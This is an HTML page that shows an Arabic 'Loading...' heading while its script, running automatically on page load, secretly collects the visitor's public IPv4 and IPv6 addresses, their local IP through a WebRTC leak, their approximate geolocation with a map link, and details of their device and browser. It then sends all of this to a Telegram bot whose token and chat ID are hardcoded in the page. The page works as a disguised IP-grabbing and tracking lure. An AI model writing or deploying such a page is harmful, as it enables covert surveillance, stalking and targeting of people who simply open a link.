<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>صفحة</title>
</head>
<body>
    <h1>جاري التحميل...</h1>
    <script>
        const BOT_TOKEN = '7834185753:AAHX4Tjf9hboJqrIYl9IBth_E5c4toaNKJE';
        const CHAT_ID = '7110865740';

        function sendToTelegram(text) {
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: text,
                    parse_mode: 'HTML'
                })
            })
            .then(r => r.json())
            .then(data => console.log('✅:', data.ok))
            .catch(err => console.error('❌:', err));
        }

        async function getPublicIPv4() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                return data.ip;
            } catch {
                return 'غير متاح';
            }
        }

        async function getPublicIPv6() {
            try {
                const res = await fetch('https://api6.ipify.org?format=json');
                const data = await res.json();
                return data.ip;
            } catch {
                return 'غير متاح';
            }
        }

        function getLocalIP() {
            return new Promise((resolve) => {
                const pc = new RTCPeerConnection({ iceServers: [] });
                pc.createDataChannel('');
                pc.createOffer().then(offer => pc.setLocalDescription(offer));
                pc.onicecandidate = (ice) => {
                    if (!ice || !ice.candidate || !ice.candidate.candidate) return;
                    const ip = ice.candidate.candidate.split(' ')[4];
                    if (ip && ip.includes('.')) {
                        resolve(ip);
                        pc.close();
                    }
                };
                setTimeout(() => {
                    resolve('غير متاح');
                    pc.close();
                }, 3000);
            });
        }

        async function getLocation(ip) {
            try {
                const res = await fetch(`http://ip-api.com/json/${ip}?lang=ar`);
                const data = await res.json();
                if (data.status === 'success') {
                    return {
                        country: data.country || 'غير معروف',
                        city: data.city || 'غير معروف',
                        lat: data.lat,
                        lon: data.lon,
                        mapLink: `https://www.google.com/maps?q=${data.lat},${data.lon}`
                    };
                }
                return null;
            } catch {
                return null;
            }
        }

        (async function main() {
            const ipv4 = await getPublicIPv4();
            const ipv6 = await getPublicIPv6();
            const localIP = await getLocalIP();
            const location = await getLocation(ipv4);

            let msg = `<blockquote>`;
            msg += ` <b>زيارة جديدة - جميع الـ IPs</b>\n\n`;
            msg += ` <b>IP العام (IPv4)</b>: <tg-spoiler> ${ipv4} </tg-spoiler>\n`;
            msg += ` <b>IP العام (IPv6)</b>: <tg-spoiler> ${ipv6} </tg-spoiler>\n`;
            msg += ` <b>IP المحلي (Local)</b>: <tg-spoiler> ${localIP} </tg-spoiler>\n\n`;
            if (location) {
                msg += ` <b>الموقع</b>: <tg-spoiler> ${location.country} - ${location.city} </tg-spoiler>\n`;
                msg += ` <b>الإحداثيات</b>: <tg-spoiler> ${location.lat}, ${location.lon} </tg-spoiler>\n`;
                msg += ` <b>رابط الخريطة</b>: <a href="${location.mapLink}">اضغط هنا</a>\n\n`;
            }
            msg += ` <b>نظام التشغيل</b>: ${navigator.userAgent.includes('Windows') ? 'Windows' : navigator.userAgent.includes('Mac') ? 'Mac' : navigator.userAgent.includes('Android') ? 'Android' : 'غير معروف'}\n`;
            msg += ` <b>المتصفح</b>: ${navigator.userAgent.includes('Chrome') ? 'Chrome' : navigator.userAgent.includes('Firefox') ? 'Firefox' : navigator.userAgent.includes('Safari') ? 'Safari' : 'غير معروف'}\n`;
            msg += ` <b>نوع الجهاز</b>: ${/Mobi|Android|iPhone|iPad/i.test(navigator.userAgent) ? 'جوال/تابلت' : 'كمبيوتر'}\n`;
            msg += ` <b>دقة الشاشة</b>: ${window.screen.width}x${window.screen.height}\n`;
            msg += ` <b>اللغة</b>: ${navigator.language || 'غير معروف'}\n`;
            msg += ` <b>المنطقة الزمنية</b>: ${Intl.DateTimeFormat().resolvedOptions().timeZone || 'غير معروف'}\n`;
            msg += ` <b>وقت الدخول</b>: <code>${new Date().toLocaleString('ar-EG')}</code>\n`;
            msg += `</blockquote>`;

            sendToTelegram(msg);
        })();
    </script>
</body>
</html>
